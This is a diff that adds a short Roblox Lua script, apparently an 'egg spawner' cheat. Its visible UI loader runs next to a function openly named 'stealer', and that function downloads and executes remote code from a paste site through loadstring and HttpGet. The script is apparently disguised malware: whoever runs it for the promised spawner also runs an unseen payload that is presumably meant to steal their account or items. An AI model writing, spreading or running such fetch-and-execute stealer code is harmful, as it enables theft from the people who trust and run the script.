@@ -1,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/lPCOR2euJv/0", true))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Gey123123/egg_spawner_protected/refs/heads/main/visual"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
